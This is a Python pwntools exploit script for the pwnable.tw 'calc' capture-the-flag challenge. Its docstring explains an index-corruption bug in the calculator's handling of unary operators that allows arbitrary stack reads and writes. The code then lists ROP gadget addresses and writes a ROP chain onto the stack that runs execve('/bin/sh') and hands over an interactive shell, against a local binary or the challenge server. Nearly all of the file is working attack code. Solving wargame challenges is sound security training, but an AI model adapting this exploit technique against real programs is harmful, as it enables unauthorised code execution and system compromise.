#!/usr/bin/env python3
"""
Exploit for pwnable.tw calc challenge

Vulnerability: Integer index corruption via unary operator parsing
When parsing "+N", the calculator:
1. Sees '+' first, calls atoi("") = 0, doesn't push (0 <= 0)
2. Pushes N to pool, so pool[0]=1, pool[1]=N
3. Evaluates '+': pool[0] = pool[0] + pool[1] = 1+N, then pool[0]-- = N
4. Returns pool[pool[0]] = pool[N] - arbitrary stack read!

Similarly, "+N+V" writes pool[N] += V and "+N-V" writes pool[N] -= V.

Stack layout (relative to pool base at ebp-0x5a0):
- pool[361] = ebp+4 = return address
- pool[362] = ebp+8 = saved value (we can use for ROP chain)

Exploitation: Write ROP chain to stack, execute execve("/bin/sh", NULL, NULL)
"""

from pwn import *

context.arch = "i386"
context.log_level = "info"

# Gadgets found in the statically linked binary
POP_EAX_RET = 0x0805C34B  # pop eax; ret
POP_EBX_RET = 0x080481D1  # pop ebx; ret
POP_EDX_RET = 0x080701AA  # pop edx; ret
POP_ECX_POP_EBX_RET = 0x080701D1  # pop ecx; pop ebx; ret
MOV_EDX_EAX_RET = 0x0809B30D  # mov [edx], eax; ret
INT_0x80 = 0x08049A21  # int 0x80

BSS_ADDR = 0x080ECF80  # .bss section for writing "/bin/sh"

# Pool index for return address
# pool starts at ebp-0x5a0, return address at ebp+4
# pool[N] = ebp - 0x5a0 + N*4
# ebp - 0x5a0 + N*4 = ebp + 4
# N*4 = 0x5a0 + 4 = 0x5a4 = 1444
# N = 361
RET_ADDR_IDX = 361


def to_signed(val):
    """Convert unsigned 32-bit to signed for proper arithmetic"""
    if val >= 0x80000000:
        return val - 0x100000000
    return val


def write_value(io, idx, value):
    """Write a specific value to pool[idx] using the vulnerability"""
    # First read current value
    io.sendline(f"+{idx}".encode())
    current = int(io.recvline().strip())
    current = current & 0xFFFFFFFF  # Ensure unsigned

    # Calculate delta
    delta = to_signed(value) - to_signed(current)

    if delta == 0:
        # Already correct value
        return

    if delta > 0:
        # Use addition
        io.sendline(f"+{idx}+{delta}".encode())
    else:
        # Use subtraction
        io.sendline(f"+{idx}-{-delta}".encode())

    io.recvline()  # Consume output


def exploit(io):
    # Welcome message
    io.recvline()

    # Build ROP chain to execute execve("/bin/sh", NULL, NULL)
    # Strategy:
    # 1. Write "/bin/sh\0" to .bss using mov [edx], eax gadget
    # 2. Set up registers: eax=11, ebx=/bin/sh, ecx=0, edx=0
    # 3. int 0x80

    # "/bin" = 0x6e69622f, "/sh\0" = 0x0068732f
    rop_chain = [
        # Write "/bin" to .bss
        POP_EDX_RET,
        BSS_ADDR,
        POP_EAX_RET,
        0x6E69622F,  # "/bin"
        MOV_EDX_EAX_RET,
        # Write "/sh\0" to .bss+4
        POP_EDX_RET,
        BSS_ADDR + 4,
        POP_EAX_RET,
        0x0068732F,  # "/sh\0"
        MOV_EDX_EAX_RET,
        # Set up execve(path="/bin/sh", argv=NULL, envp=NULL)
        POP_EDX_RET,
        0,  # envp = NULL
        POP_ECX_POP_EBX_RET,
        0,  # argv = NULL
        BSS_ADDR,  # path = "/bin/sh"
        POP_EAX_RET,
        11,  # execve syscall number
        INT_0x80,
    ]

    log.info(f"Writing ROP chain ({len(rop_chain)} gadgets)")

    # Write each gadget to stack
    for i, gadget in enumerate(rop_chain):
        idx = RET_ADDR_IDX + i
        log.debug(f"Writing pool[{idx}] = {gadget:#x}")
        write_value(io, idx, gadget)

    log.success("ROP chain written, triggering exploit...")

    # Send empty line to exit calc loop and trigger return
    io.sendline(b"")

    # Shell!
    io.interactive()


def main():
    if args.LOCAL:
        io = process("./calc")
    else:
        io = remote("chall.pwnable.tw", 10100)

    exploit(io)


if __name__ == "__main__":
    main()
